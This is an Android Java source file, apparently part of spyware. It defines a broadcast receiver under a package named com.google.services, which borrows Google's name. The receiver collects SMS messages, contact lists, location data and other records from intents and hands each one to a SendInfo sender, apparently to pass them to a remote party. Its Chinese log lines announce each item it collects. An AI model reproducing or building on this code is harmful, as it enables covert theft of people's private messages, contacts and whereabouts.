package com.google.services;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

public class sendReceiver extends BroadcastReceiver {
    private String name = null;
    SendInfo sender = SendInfo.getInstance();
    private String value = null;

    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("com.google.system.receiver")) {
            Bundle extras = intent.getExtras();
            if (extras == null) {
                return;
            }
            if (extras.containsKey("sms")) {
                Log.i("接收到短信了吧", extras.getString("sms"));
                this.name = "sms";
                this.value = extras.getString("sms").toString();
                this.sender.sendInfo(this.name, this.value);
            } else if (extras.containsKey("contact")) {
                Log.i("接收到通讯录", extras.getString("contact"));
                this.name = "contact";
                this.value = extras.get("contact").toString();
                this.sender.sendInfo(this.name, this.value);
            } else if (extras.containsKey("location")) {
                Log.i("接收到位置信息", extras.getString("location"));
                this.name = "location";
                this.value = extras.get("location").toString();
                this.sender.sendInfo(this.name, this.value);
            } else if (extras.containsKey("other")) {
                Log.i("接收到record", extras.getString("other"));
                this.name = "other";
                this.value = extras.get("other").toString();
                this.sender.sendInfo(this.name, this.value);
            }
        }
    }
}
